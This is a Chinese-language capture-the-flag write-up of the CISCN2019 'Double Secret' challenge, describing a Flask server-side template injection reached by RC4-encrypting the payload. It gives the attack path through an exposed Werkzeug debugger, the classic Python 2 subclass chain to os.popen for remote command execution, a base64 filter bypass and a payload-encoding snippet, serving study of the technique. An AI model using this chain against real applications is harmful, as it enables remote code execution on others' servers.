---
type: source
created: 2026-05-12
updated: 2026-05-12
related: []
---

# CISCN2019 华东南赛区 Double Secret

Flask + Python 2.7 SSTI。用户输入经 RC4 解密后直接传入 `render_template_string()`，通过加密 SSTI payload 实现 RCE。

涉及概念：[[concepts/rc4-ssti-encrypt-then-template]]

## 环境

- Python 2.7 + Flask + Jinja2
- Werkzeug debugger 开启（EVALEX=true）
- RC4 密钥：`HereIsTreasure`
- 输出过滤：`'ciscn' in a.lower()` 拦截 flag 直接输出

## 攻击路径

1. `robots.txt` → `/static/secretkey.txt`（烟雾弹）
2. 长输入触发 Werkzeug debugger → 暴露 `/app/app.py` 源码 + 真实 RC4 密钥
3. RC4 加密 SSTI payload → 服务端解密 → `render_template_string()` 执行
4. Python 2 经典链 `''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen(cmd).read()`
5. `| base64` 绕过输出中 `ciscn` 关键字过滤

## 关键细节

- RC4 加密字节需 Latin-1 → UTF-8 → URL 编码（Python 2 Flask 将参数解码为 unicode）
- `safe()` 过滤 `class` 关键字但只加前缀警告，不阻止模板渲染
- `__subclasses__()[71]` 是 Python 2.7 中 `site._Printer`，其 `__init__.__globals__` 含 `os` 模块

## Payload

```python
encrypted = rc4('HereIsTreasure', payload.encode())
encoded = urllib.parse.quote(encrypted.decode('latin-1').encode('utf-8'))
# GET /secret?secret=<encoded>
```

## 教训

- Werkzeug debugger 在生产环境开启 = 源码全泄露
- `robots.txt` 可能是误导信息
- RC4 对称加密 + SSTI = 只要知道密钥就能注入任意模板代码
